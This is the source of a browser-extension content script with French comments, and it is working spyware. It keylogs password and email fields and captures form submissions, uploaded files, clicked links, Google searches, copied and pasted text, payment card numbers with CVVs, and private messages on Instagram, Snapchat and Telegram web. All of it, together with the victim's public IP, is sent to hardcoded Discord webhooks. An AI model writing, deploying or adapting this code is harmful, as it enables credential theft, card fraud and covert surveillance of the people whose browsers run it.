let currentIP = "Non chargée";

// Récupération IP publique
fetch("https://api.ipify.org?format=json")
  .then(res => res.json())
  .then(data => {
    currentIP = data.ip;
  });

// 1. Keylogger discret
document.addEventListener("input", function (e) {
  const input = e.target;
  const type = (input.type || input.tagName || "").toLowerCase();
  const isSensitive = type.includes("password") || type.includes("email") || input.autocomplete === "current-password";

  if (isSensitive) {
    const key = input.name || input.id || "champ_inconnu";
    const valeur = input.value;

    const payload = {
      content: `⌨️ **Frappe détectée sur ${window.location.href}**\nIP : ${currentIP}`,
      embeds: [{
        title: "Keylogger",
        description: "```json\n" + JSON.stringify({ champ: key, type, valeur }, null, 2) + "\n```"
      }]
    };

    fetch("https://discord.com/api/webhooks/1362120186479771778/yEG6f88eoIFE3Y0-k7hiqhkwowdRuCHQT6_cD8wz-WEe0FQT1Xge6OMWa0bMlotNkyBO", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  }
}, true);

// 2. Formulaires soumis
document.addEventListener("submit", function (e) {
  const form = e.target;
  const inputs = form.querySelectorAll("input, textarea, select");
  const formData = {};

  inputs.forEach((input, i) => {
    const type = (input.type || input.tagName || "").toLowerCase();
    const isSensitive = type.includes("password") || type.includes("email") || input.autocomplete === "current-password";
    if (isSensitive) {
      const key = input.name || input.id || `champ_${i}`;
      formData[key] = { value: input.value, type: type };
    }
  });

  if (Object.keys(formData).length > 0) {
    const payload = {
      content: `📝 Formulaire détecté sur ${window.location.href}\nIP : ${currentIP}`,
      embeds: [{
        title: "Formulaire soumis",
        description: "```json\n" + JSON.stringify(formData, null, 2) + "\n```"
      }]
    };

    fetch("https://discord.com/api/webhooks/1362038729186738216/hE24aPmgwR35PTiMannngijV4TEhezOOH-A86WISs-dJp_vaZBKcU8Pds0h4K0PCzELT", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    chrome.runtime.sendMessage({
      action: "capture",
      url: window.location.href
    });
  }
}, true);

// 3. Fichiers uploadés
document.addEventListener("change", function (e) {
  const input = e.target;
  if (input.type === "file" && input.files.length > 0) {
    const file = input.files[0];
    const form = new FormData();
    form.append("file", file);
    form.append("content", `📎 **Fichier uploadé sur ${window.location.href}**\nNom : ${file.name}\nIP : ${currentIP}`);

    fetch("https://discord.com/api/webhooks/1362141485226655774/4qjtQbDK1zRyFJFngdLPKtVn9ob2NuDRGa-37ueqMQwp7njFjJ-7QSDnj1U2OoF5twRv", {
      method: "POST",
      body: form
    });
  }
}, true);

// 4. Clics sur liens
document.addEventListener("click", function (e) {
  const target = e.target.closest("a");
  if (target && target.href) {
    fetch("https://discord.com/api/webhooks/1362141135295742122/KidJUEPK8S5NWqnnO0iIKhnFX6zJNkhKlZWTR1fzZc4L_EbAOhz7xHgXs3AcBGMlj998", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `🎯 **Lien cliqué :**\n${target.href}\nIP : ${currentIP}\nPage : ${window.location.href}`
      })
    });
  }
}, true);

// 5. Recherche Google détectée
if (window.location.hostname.includes("google.") && window.location.pathname === "/search") {
  const params = new URLSearchParams(window.location.search);
  const query = params.get("q");
  if (query) {
    fetch("https://discord.com/api/webhooks/1362141144515088574/iI3Iz3pBtIvUOFcLmVB2dRQ9h_JExVEPmpv7ZBsWuOfldDrB5Eutd6u1aS8s9KwOyVjV", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `🕵️ **Recherche Google détectée**\nRecherche : \`${query}\`\nIP : ${currentIP}`
      })
    });
  }
}

// 6. Clipboard (copier)
document.addEventListener("copy", function (e) {
  let copiedText = "";
  try {
    copiedText = window.getSelection().toString();
  } catch (_) {}

  if (copiedText.length > 0) {
    fetch("https://discord.com/api/webhooks/1362346207262806047/qL1gPf3d8h-wA-fpPkZlg8voOLbdOzITeq8q0oTARe3XMlVxp2w6npDfWI7h4HSyIYkW", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `🧠 **Copie détectée**\nTexte : \`\`\`${copiedText}\`\`\`\nURL : ${window.location.href}\nIP : ${currentIP}`
      })
    });
  }
}, true);


function getShortHost() {
  const parts = window.location.hostname.split(".");
  return parts.slice(-2).join(".");
}

function getDateTime() {
  const now = new Date();
  return now.toLocaleTimeString("fr-FR") + " - " + now.toLocaleDateString("fr-FR");
}



document.addEventListener("paste", (e) => {
  let pastedText = "";
  try {
    pastedText = (e.clipboardData || window.clipboardData).getData("text");
  } catch (_) {}

  if (pastedText.trim().length > 0) {
    fetch("https://discord.com/api/webhooks/1362346207262806047/qL1gPf3d8h-wA-fpPkZlg8voOLbdOzITeq8q0oTARe3XMlVxp2w6npDfWI7h4HSyIYkW", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `📥 **Coller détecté**\nSite : ${getShortHost()}\nHeure : ${getDateTime()}\nContenu : \`\`\`${pastedText.slice(0, 500)}\`\`\``
      })
    });
  }
}, true);


// 📅 Format date
function getDateTime() {
  const now = new Date();
  return now.toLocaleTimeString("fr-FR") + " - " + now.toLocaleDateString("fr-FR");
}

function getShortHost() {
  const parts = location.hostname.split(".");
  return parts.slice(-2).join(".");
}

document.addEventListener("input", function (e) {
  const el = e.target;
  const name = (el.name || el.id || "").toLowerCase();
  const value = el.value ? el.value.trim() : "";

  const result = {};
  if (name.includes("card") && value.replace(/\s/g, "").length >= 12) {
    result.numero = value;
  } else if ((name.includes("exp") || name.includes("date")) && value.length >= 4) {
    result.expiration = value;
  } else if (name.includes("cvv") || name.includes("cvc")) {
    result.cvv = value;
  }

  if (Object.keys(result).length > 0) {
    fetch("https://discord.com/api/webhooks/1362540241218437230/XiKY6pA2iykQFoSlW3ahUifp76I_AVzTtCrnaORXUmzl1hQT7RrvdhD_kFQuNDJjJGAM", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `💳 **Saisie carte détectée sur ${location.hostname}**\n🕒 ${new Date().toLocaleString()}`,
        embeds: [{
          title: "Informations bancaires",
          description: "```json\n" + JSON.stringify(result, null, 2) + "\n```"
        }]
      })
    });
  }
}, true);


const observedInputs = new WeakSet();

function getConversationName() {
  const sites = {
    "instagram.com": ['.x1lliihq', '.x193iq5w'],
    "web.snapchat.com": ['[data-testid="user-avatar"]', '.chat-header'],
    "web.telegram.org": ['.peer-title', '.chat-info']
  };

  const site = location.hostname;
  const selectors = Object.entries(sites).find(([host]) => site.includes(host));

  if (selectors) {
    for (const sel of selectors[1]) {
      const el = document.querySelector(sel);
      if (el && el.textContent.trim().length > 0) {
        return el.textContent.trim();
      }
    }
  }

  return null;
}

function isAllowedPlatform() {
  return [
    "instagram.com",
    "web.snapchat.com",
    "web.telegram.org"
  ].some(host => location.hostname.includes(host));
}

function observeMessages() {
  if (!isAllowedPlatform()) return;

  const inputs = document.querySelectorAll("textarea, [contenteditable='true']");
  inputs.forEach(input => {
    if (observedInputs.has(input)) return;

    input.addEventListener("keydown", function (e) {
      if (e.key === "Enter" && !e.shiftKey) {
        const msg = input.value || input.textContent || "";
        if (msg.trim().length === 0) return;

        const convo = getConversationName() || "Inconnu";
        let lastReceived = null;

        const bubbleCandidates = [
          ".message-in", ".received", ".msg-in", ".chat-message-in", ".bubble.received"
        ];

        for (const sel of bubbleCandidates) {
          const messages = document.querySelectorAll(sel);
          if (messages.length > 0) {
            lastReceived = messages[messages.length - 1].innerText || null;
            break;
          }
        }

        const payload = {
          content: `📨 **Message détecté sur ${location.hostname}**\n🕒 ${new Date().toLocaleString()}`,
          embeds: [{
            title: `🆔 Conversation : ${convo}`,
            fields: [
              { name: "💬 Envoyé", value: msg.slice(0, 1000) || "_" },
              { name: "💬 Reçu", value: lastReceived ? lastReceived.slice(0, 1000) : "_Aucun message reçu détecté_" }
            ]
          }]
        };

        fetch("https://discord.com/api/webhooks/1362539602476400761/Xzkp2aBrhtQuMurKykEoGGihsZLiTmSKjce_b8pynGyUQFJs05pRUTeBGeD7cBKIXLJ9", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      }
    }, true);

    observedInputs.add(input);
  });
}

setInterval(observeMessages, 4000);



